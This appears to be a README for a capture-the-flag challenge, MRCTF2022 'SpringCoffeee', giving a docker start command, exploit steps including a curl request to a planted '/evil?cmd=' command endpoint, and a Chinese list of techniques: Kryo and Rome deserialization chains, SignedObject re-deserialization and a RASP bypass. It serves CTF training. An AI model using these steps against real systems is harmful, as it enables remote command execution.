# MRCTF2022 SpringCoffeee

## 环境启动

```
docker-compose up -d --build
```

## Exp

```
cd exp
python exp.py
curl localhost:10805/evil?cmd=/readflag
```

## WriteUp

考点：Controller 单例模式+Kryo反序列化+Rome反序列化链+SignedObject二次反序列化+Rasp绕过